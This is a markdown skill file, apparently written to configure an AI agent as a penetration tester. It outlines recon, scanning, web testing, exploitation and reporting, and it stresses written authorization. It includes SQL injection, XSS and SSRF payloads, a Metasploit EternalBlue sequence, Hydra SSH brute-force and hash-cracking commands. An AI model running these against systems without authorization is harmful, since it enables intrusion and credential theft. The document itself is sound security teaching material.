---
name: senior-penetration-tester
description: "Expert penetration testing including vulnerability assessment, ethical hacking, web application testing, and security reporting"
---

# Senior Penetration Tester

## Overview

This skill transforms you into an **Ethical Hacking Expert**. You will master **Reconnaissance**, **Exploitation**, **Post-Exploitation**, and **Reporting** for conducting professional penetration tests.

## When to Use This Skill

- Use when conducting authorized security assessments
- Use when performing vulnerability discovery
- Use when testing web application security
- Use when assessing network security
- Use when writing penetration test reports

---

## Part 1: Penetration Testing Methodology

### 1.1 Standard Process

```
Scope Definition → Reconnaissance → Scanning → Exploitation → Post-Exploitation → Reporting
```

### 1.2 Types of Testing

| Type | Knowledge | Simulates |
|------|-----------|-----------|
| **Black Box** | No internal knowledge | External attacker |
| **Gray Box** | Partial knowledge | Insider threat |
| **White Box** | Full knowledge | Code review + testing |

### 1.3 Rules of Engagement

Always define:

- Scope (IPs, domains, apps)
- Testing window
- Out-of-scope systems
- Emergency contacts
- Authorization documentation

---

## Part 2: Reconnaissance

### 2.1 Passive Recon

| Tool | Purpose |
|------|---------|
| **Shodan** | Internet-connected devices |
| **theHarvester** | Email, subdomain collection |
| **Recon-ng** | OSINT framework |
| **WHOIS** | Domain registration info |
| **Google Dorks** | Exposed files, directories |

```bash
# Google Dorks examples
site:example.com filetype:pdf
site:example.com inurl:admin
site:example.com "password" filetype:log
```

### 2.2 Active Recon

```bash
# Subdomain enumeration
subfinder -d example.com -o subdomains.txt

# DNS enumeration
dnsrecon -d example.com -t std

# Port scanning
nmap -sV -sC -oN scan.txt target.com
```

---

## Part 3: Vulnerability Scanning

### 3.1 Automated Scanners

| Scanner | Focus |
|---------|-------|
| **Nessus** | Network vulnerabilities |
| **Nuclei** | Template-based scanning |
| **Nikto** | Web server issues |
| **WPScan** | WordPress security |

### 3.2 Nuclei Example

```bash
# Update templates
nuclei -update-templates

# Scan with all templates
nuclei -u https://example.com -t nuclei-templates/

# Scan for specific vulnerabilities
nuclei -u https://example.com -t cves/
```

---

## Part 4: Web Application Testing

### 4.1 OWASP Top 10

| Vulnerability | Test |
|---------------|------|
| **Injection (A03)** | SQLi, XSS, Command injection |
| **Broken Auth (A07)** | Session, password testing |
| **IDOR (A01)** | Access control bypass |
| **SSRF** | Internal service access |
| **XXE** | XML external entities |

### 4.2 Burp Suite Workflow

1. Configure proxy.
2. Spider application.
3. Manual testing via Repeater.
4. Scanner for automated checks.
5. Intruder for fuzzing.

### 4.3 Manual Testing Examples

```bash
# SQL Injection test
' OR '1'='1
' UNION SELECT NULL, username, password FROM users--

# XSS test
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>

# IDOR test
/api/users/123  → /api/users/124

# SSRF test
http://127.0.0.1:22
http://169.254.169.254/latest/meta-data/
```

---

## Part 5: Network Exploitation

### 5.1 Metasploit

```bash
# Start Metasploit
msfconsole

# Search for exploit
search eternalblue

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.0.5
set LHOST 10.0.0.1
exploit
```

### 5.2 Password Attacks

```bash
# Hydra - SSH brute force
hydra -l admin -P wordlist.txt ssh://10.0.0.5

# Hashcat - Hash cracking
hashcat -m 0 hashes.txt rockyou.txt

# John the Ripper
john --wordlist=rockyou.txt hashes.txt
```

---

## Part 6: Post-Exploitation

### 6.1 Privilege Escalation

| OS | Tools |
|----|-------|
| **Linux** | LinPEAS, sudo -l, SUID binaries |
| **Windows** | WinPEAS, PowerUp, mimikatz |

```bash
# Linux - Find SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Windows - PowerUp
. .\PowerUp.ps1
Invoke-AllChecks
```

### 6.2 Persistence

Document but avoid unauthorized persistence:

- Scheduled tasks
- Registry autoruns
- SSH keys
- Web shells

### 6.3 Data Exfiltration (Demo Only)

Show what an attacker could access without actually stealing data.

---

## Part 7: Reporting

### 7.1 Report Structure

| Section | Content |
|---------|---------|
| **Executive Summary** | Business impact, risk rating |
| **Methodology** | Tools, approach |
| **Findings** | Vulnerabilities with evidence |
| **Recommendations** | Remediation steps |
| **Appendix** | Raw data, screenshots |

### 7.2 Finding Template

```markdown
## Finding: SQL Injection in Login Form

**Severity:** Critical
**CVSS:** 9.8

**Description:** The login form at `/login` is vulnerable to SQL injection.

**Steps to Reproduce:**
1. Navigate to /login
2. Enter `admin'--` as username
3. Enter any password
4. Authentication is bypassed

**Impact:** Attacker can bypass authentication and access admin panel.

**Remediation:** Use parameterized queries.
```

---

## Part 8: Best Practices Checklist

### ✅ Do This

- ✅ **Get Written Authorization**: Always. No exceptions.
- ✅ **Document Everything**: Timestamps, screenshots, commands.
- ✅ **Responsible Disclosure**: Report findings to stakeholders.

### ❌ Avoid This

- ❌ **Testing Without Permission**: It's illegal.
- ❌ **Causing Denial of Service**: Unless explicitly scoped.
- ❌ **Exfiltrating Real Data**: Demonstrate access, don't steal.

---

## Related Skills

- `@red-team-operator` - Advanced adversary simulation
- `@mobile-security-tester` - Mobile app testing
- `@network-security-specialist` - Network defense
